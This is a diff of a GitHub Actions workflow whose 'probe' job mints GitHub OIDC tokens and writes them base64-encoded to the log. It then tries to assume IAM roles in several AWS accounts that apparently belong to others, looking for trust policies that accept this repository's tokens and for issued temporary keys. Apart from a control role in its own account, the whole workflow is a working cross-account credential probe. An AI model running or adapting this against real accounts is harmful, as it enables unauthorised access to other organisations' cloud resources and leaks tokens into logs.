@@ -10,28 +10,18 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: mint-and-probe
+      - name: stale-thumbprint-and-default-aud
         run: |
-          echo "EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF"
-          for aud in sts.amazonaws.com aws sigv4.amazonaws.com appsecengineer https://appsecengineer.com; do
-            tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$aud" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
-            echo "AUDREQ=$aud JWTB64=$(echo -n "$tok" | base64 -w0)"
-            python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('  CLAIM_AUD='+c['aud']+' SUB='+c['sub'])" "$tok"
-            for r in \
-              arn:aws:iam::358174707935:role/auto-deploy-GitHubActionsRole \
-              arn:aws:iam::559556671935:role/auto-deploy-GitHubActionsRole \
-              arn:aws:iam::170026776852:role/auto-deploy-GitHubActionsRole \
-              arn:aws:iam::170026776852:role/ase-deploy-GitHubActionsRole ; do
-              err=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name "artex10891" --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
-              code=$(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied|NoSuchEntity|ExpiredTokenException|ValidationError)[^)]*\)' | head -1)
-              [ -z "$code" ] && code=$(echo "$err" | head -c 250 | tr '\n' ' ')
-              echo "  ROLE $r => $code"
-              sleep 1.5
-            done
-          done
-          echo "=== control: valid token vs nonexistent role in 060717612896 ==="
+          tokdef=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+          echo "DEFAULT_JWTB64=$(echo -n "$tokdef" | base64 -w0)"
+          python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('DEFAULT_CLAIM_AUD='+str(c['aud'])+' SUB='+c['sub'])" "$tokdef"
           tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
-          err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-does-not-exist --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
-          echo "NONEXIST_ROLE => $(echo "$err" | head -c 300 | tr '\n' ' ')"
           err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-oidc-test --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1 || true)
-          echo "CONTROL_ROLE => $(echo "$err" | grep -oE 'ASIA[A-Z0-9]+' | head -1) $(echo "$err" | head -c 120 | tr '\n' ' ')"
+          echo "CONTROL_STALE_THUMB => $(echo "$err" | grep -oE 'ASIA[A-Z0-9]+' | head -1) $(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied)[^)]*\)' | head -1)"
+          err=$(aws sts assume-role-with-web-identity --role-arn arn:aws:iam::060717612896:role/artex10891-oidc-test --role-session-name artex10891 --web-identity-token "aaaa.bbbb.cccc" --duration-seconds 900 --output json 2>&1 || true)
+          echo "CONTROL_MALFORMED => $(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied)[^)]*\)' | head -1)"
+          for r in arn:aws:iam::358174707935:role/auto-deploy-GitHubActionsRole arn:aws:iam::559556671935:role/auto-deploy-GitHubActionsRole; do
+            err=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name artex10891 --web-identity-token "$tokdef" --duration-seconds 900 --output json 2>&1 || true)
+            echo "DEFAULTAUD_ROLE $r => $(echo "$err" | grep -oE '\((InvalidIdentityToken|AccessDenied)[^)]*\)' | head -1)"
+            sleep 1.5
+          done
